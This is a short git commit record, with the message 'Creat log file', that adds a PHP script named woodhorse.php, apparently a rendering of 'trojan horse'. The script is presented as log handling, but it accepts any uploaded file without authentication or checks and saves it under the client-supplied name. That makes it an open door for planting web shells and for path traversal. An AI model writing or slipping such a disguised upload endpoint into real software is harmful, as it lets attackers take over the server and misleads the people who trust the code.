fdcfe66a58f3a469d4e184073a37e1e703cbf3f8
g9308370 <g9308370@hotmail.com>
2015-05-05 21:12:27 +0800

    Creat log file

---
+++ woodhorse.php
@@ -0,0 +1,8 @@
+<?php
+$uploads_dir = '/log';  //此為你伺服器存放記錄檔的目錄
+if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
+    $tmp_name = $_FILES["file"]["tmp_name"];
+    $name = $_FILES["file"]["name"];
+    move_uploaded_file($tmp_name, "$uploads_dir/$name");
+}
+?>
